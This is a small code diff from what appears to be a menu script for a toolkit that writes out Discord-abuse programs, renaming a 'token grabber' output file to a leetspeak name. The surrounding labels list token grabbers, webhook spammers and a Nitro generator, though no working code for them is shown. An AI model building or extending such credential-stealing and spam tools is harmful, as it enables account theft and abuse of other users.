@@ -49,7 +49,7 @@ build = input()
 # Options variables
 OP_1 = 'has been saved as Token Gen.py'
 OP_2 = 'has been saved as Webhook Spammer.py'
-OP_3 = 'has been saved as PRO Token Grabber.py'
+OP_3 = 'has been saved as Plain_Tok3n_Grabber.py'
 OP_4 = 'has been saved as Token Grabber.py'
 OP_5 = 'has been saved as Spammer.py'
 OP_6 = 'has been saved as Nitro Gen+checker.py'
